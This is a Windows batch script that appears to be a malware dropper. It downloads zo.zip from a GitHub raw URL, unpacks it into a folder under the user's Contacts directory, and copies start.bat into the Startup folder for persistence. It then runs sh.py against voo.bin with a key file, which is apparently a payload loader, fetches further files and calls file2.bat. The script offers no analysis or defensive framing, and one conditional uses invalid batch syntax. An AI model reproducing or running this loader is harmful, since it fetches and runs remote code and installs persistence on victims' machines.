@echo off
setlocal

set "site_url=https://raw.githubusercontent.com/MoViper2244/VIPER2/refs/heads/main/"
set "z=%TEMP%\zo.zip"
set "d=%USERPROFILE%\Contacts\zo"
set "s=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\start.bat"

:: Create target directory if not exists
if not exist "%d%" mkdir "%d%"

:: Download zo.zip from the website
powershell -nologo -noprofile -command "$w=New-Object Net.WebClient;$w.DownloadFile('%site_url%zo.zip','%z%')"

:: Extract the zip file
powershell -nologo -noprofile -command "Expand-Archive -LiteralPath '%z%' -DestinationPath '%d%' -Force"
del "%z%"

:: Copy start.bat to startup folder
copy "%APPDATA%\start.bat" "%s%"

:: Run the Python script (dacă există)
cd /d "%d%"
if exist "sh.py" (
    if exist "voo.bin" and exist "x.txt" (
        python.exe sh.py -i voo.bin -k x.txt
    )
)

:: Download result files based on exit code
if %errorlevel%==0 (
    powershell -nologo -noprofile -command "$w=New-Object Net.WebClient;$w.DownloadFile('%site_url%a.txt','%TEMP%\a.txt')"
) else (
    powershell -nologo -noprofile -command "$w=New-Object Net.WebClient;$w.DownloadFile('%site_url%b.txt','%TEMP%\b.txt')"
)

:: Run file2.bat
if exist "%TEMP%\file2.bat" (
    call "%TEMP%\file2.bat"
)
